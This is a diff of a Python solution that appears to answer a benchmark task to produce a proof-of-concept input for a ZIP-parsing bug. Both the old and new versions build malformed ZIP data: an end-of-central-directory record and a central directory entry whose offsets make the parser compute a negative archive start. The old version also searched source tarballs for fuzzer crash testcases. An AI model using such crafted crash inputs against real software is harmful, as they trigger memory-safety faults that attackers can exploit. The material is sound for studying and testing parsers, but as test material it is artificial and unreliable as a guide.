@@ -1,171 +1,137 @@
-import io
 import os
+import io
 import re
-import struct
 import tarfile
-from typing import Optional, Tuple, List
+import struct
+from typing import Optional
 
 
 class Solution:
-    def _is_probably_text(self, data: bytes) -> bool:
-        if not data:
-            return True
-        if b"\x00" in data:
-            return False
-        sample = data[:4096]
-        printable = 0
-        for b in sample:
-            if b in (9, 10, 13) or 32 <= b <= 126:
-                printable += 1
-        return printable / max(1, len(sample)) >= 0.95
-
-    def _zip_negative_archive_offset_poc(self) -> bytes:
-        # EOCD at offset 0 with non-zero central directory size => archive start offset becomes negative.
-        # Total length: 22 + 24 = 46
-        eocd = struct.pack(
-            "<IHHHHIIH",
-            0x06054B50,  # signature "PK\x05\x06"
-            0,  # disk number
-            0,  # disk with central directory
-            1,  # entries on this disk
-            1,  # total entries
-            1,  # central directory size
-            0,  # central directory offset
-            24,  # comment length
-        )
-        return eocd + (b"A" * 24)
-
-    def _find_embedded_poc(self, tf: tarfile.TarFile) -> Optional[bytes]:
-        bad_ext = {
-            ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inl",
-            ".py", ".md", ".rst", ".txt", ".json", ".toml", ".yml", ".yaml",
-            ".cmake", ".mk", ".make", ".am", ".ac", ".m4", ".sh", ".bat", ".ps1",
-            ".html", ".css", ".js", ".ts", ".java", ".go", ".rs", ".swift",
-            ".patch", ".diff", ".csv", ".xml",
-        }
-
-        strong_name_keys = (
-            "clusterfuzz-testcase-minimized",
-            "clusterfuzz",
-            "testcase",
-            "crash",
-            "repro",
-            "poc",
-            "ossfuzz",
-            "oss-fuzz",
-        )
-        dir_keys = ("corpus", "seed", "testdata", "test-data", "poc", "pocs", "repro", "crash")
-
-        candidates: List[Tuple[int, int, str, bytes]] = []
-
-        for m in tf:
-            if not m.isfile():
+    def _tar_iter_text_members(self, tf: tarfile.TarFile):
+        for m in tf.getmembers():
+            if not m.isreg():
                 continue
-            if m.size <= 0 or m.size > 1_000_000:
-                continue
+            n = m.name.lower()
+            if n.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")):
+                yield m
 
-            name = m.name
-            lname = name.lower()
-            base = os.path.basename(lname)
-            _, ext = os.path.splitext(base)
-
-            name_has_strong = any(k in lname for k in strong_name_keys)
-            name_in_dirs = any(f"/{k}/" in lname or lname.startswith(f"{k}/") for k in dir_keys)
-
-            if not (name_has_strong or name_in_dirs or (m.size <= 8192 and ext in (".bin", ".dat", ".zip", ".7z", ".rar", ".cab", ".arj", ".z", ".gz", ".bz2", ".xz"))):
-                continue
-
-            f = tf.extractfile(m)
-            if f is None:
-                continue
+    def _read_member_text(self, tf: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 262144) -> str:
+        f = tf.extractfile(m)
+        if f is None:
+            return ""
+        try:
+            b = f.read(limit)
+        finally:
             try:
-                data = f.read()
-            finally:
                 f.close()
-
-            if not data:
-                continue
-
-            likely_text = self._is_probably_text(data)
-            if likely_text and not name_has_strong:
-                continue
-            if ext in bad_ext and not name_has_strong:
-                continue
-
-            score = 0
-            if name_has_strong:
-                score += 200
-            if "clusterfuzz-testcase-minimized" in lname:
-                score += 500
-            if name_in_dirs:
-                score += 80
-            if ext in (".zip", ".7z", ".rar", ".cab", ".bin", ".dat"):
-                score += 40
-            if len(data) == 46:
-                score += 150
-            # prefer small
-            score -= min(len(data), 65536) // 16
-
-            candidates.append((score, len(data), name, data))
-
-        if not candidates:
-            return None
-        candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
-        return candidates[0][3]
-
-    def _source_mentions_zip_eocd(self, tf: tarfile.TarFile) -> bool:
-        patterns = (
-            "0x06054b50",
-            "06054b50",
-            "pk\\x05\\x06",
-            "pk\\005\\006",
-            "end of central directory",
-            "eocd",
-            "central directory",
-            "archive_start_offset",
-            "archive start offset",
-        )
-        text_ext = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inl"}
-        checked = 0
-        for m in tf:
-            if not m.isfile() or m.size <= 0 or m.size > 400_000:
-                continue
-            name = m.name.lower()
-            _, ext = os.path.splitext(name)
-            if ext not in text_ext:
-                continue
-            f = tf.extractfile(m)
-            if f is None:
-                continue
-            try:
-                data = f.read(200_000)
-            finally:
-                f.close()
-            try:
-                txt = data.decode("utf-8", "ignore").lower()
             except Exception:
-                continue
-            if any(p in txt for p in patterns):
-                return True
-            checked += 1
-            if checked >= 400:
-                break
-        return False
+                pass
+        return b.decode("latin-1", errors="ignore")
 
-    def solve(self, src_path: str) -> bytes:
+    def _detect_zip_and_constraints(self, src_path: str) -> tuple[bool, bool]:
+        is_zip_related = False
+        fname_zero_invalid = False
+
+        zip_name_hint = re.compile(r"(zip|pkzip|miniz|libzip|archive_read.*zip|central.*directory|eocd)", re.IGNORECASE)
+        zip_marker_hint = re.compile(r"(0x06054b50|0x02014b50|0x04034b50|PK\\005\\006|PK\\001\\002|PK\\003\\004|end of central directory|central directory)", re.IGNORECASE)
+        fname_zero_hint = re.compile(r"(filename|file name|fname)[^;\n]{0,80}==\s*0", re.IGNORECASE)
+
+        total_read = 0
+        max_total = 24 * 1024 * 1024
+
         try:
             with tarfile.open(src_path, "r:*") as tf:
-                poc = self._find_embedded_poc(tf)
-                if poc is not None and len(poc) > 0:
-                    return poc
+                members = list(self._tar_iter_text_members(tf))
+                members.sort(key=lambda x: (0 if zip_name_hint.search(x.name) else 1, x.size))
+                for m in members:
+                    if total_read >= max_total:
+                        break
+                    if m.size <= 0:
+                        continue
+                    txt = self._read_member_text(tf, m, limit=262144)
+                    total_read += min(m.size, 262144)
+                    if not is_zip_related and (zip_name_hint.search(m.name) or zip_marker_hint.search(txt)):
+                        is_zip_related = True
+                    if is_zip_related and not fname_zero_invalid and fname_zero_hint.search(txt):
+                        fname_zero_invalid = True
+                    if is_zip_related and fname_zero_invalid:
+                        break
         except Exception:
             pass
 
-        try:
-            with tarfile.open(src_path, "r:*") as tf2:
-                if self._source_mentions_zip_eocd(tf2):
-                    return self._zip_negative_archive_offset_poc()
-        except Exception:
-            pass
+        return is_zip_related, fname_zero_invalid
 
-        return self._zip_negative_archive_offset_poc()
+    def _build_zip_poc(self, filename_len: int) -> bytes:
+        if filename_len < 0:
+            filename_len = 0
+        if filename_len > 255:
+            filename_len = 255
+        filename = b"A" * filename_len
+
+        cd_sig = 0x02014B50
+        ver_made = 20
+        ver_need = 20
+        gp_flags = 0
+        comp_method = 0
+        mod_time = 0
+        mod_date = 0
+        crc32 = 0
+        comp_size = 0
+        uncomp_size = 0
+        fname_len = filename_len
+        extra_len = 0
+        comment_len = 0
+        disk_start = 0
+        int_attr = 0
+        ext_attr = 0
+        local_hdr_off = 0
+
+        cd_fixed = struct.pack(
+            "<IHHHHHHIIIHHHHHII",
+            cd_sig,
+            ver_made,
+            ver_need,
+            gp_flags,
+            comp_method,
+            mod_time,
+            mod_date,
+            crc32,
+            comp_size,
+            uncomp_size,
+            fname_len,
+            extra_len,
+            comment_len,
+            disk_start,
+            int_attr,
+            ext_attr,
+            local_hdr_off,
+        )
+        cd = cd_fixed + filename
+        cd_size = len(cd)
+
+        eocd_sig = 0x06054B50
+        disk_no = 0
+        cd_disk_no = 0
+        entries_disk = 1
+        entries_total = 1
+        cd_offset = 1  # makes computed archive start = (actual_cd_pos) - cd_offset = -1
+
+        eocd = struct.pack(
+            "<IHHHHIIH",
+            eocd_sig,
+            disk_no,
+            cd_disk_no,
+            entries_disk,
+            entries_total,
+            cd_size,
+            cd_offset,
+            0,
+        )
+
+        return cd + eocd
+
+    def solve(self, src_path: str) -> bytes:
+        is_zip, fname_zero_invalid = self._detect_zip_and_constraints(src_path)
+        # Even if detection fails, defaulting to ZIP is a reasonable guess for this bug description.
+        filename_len = 1 if fname_zero_invalid else 0
+        return self._build_zip_poc(filename_len)
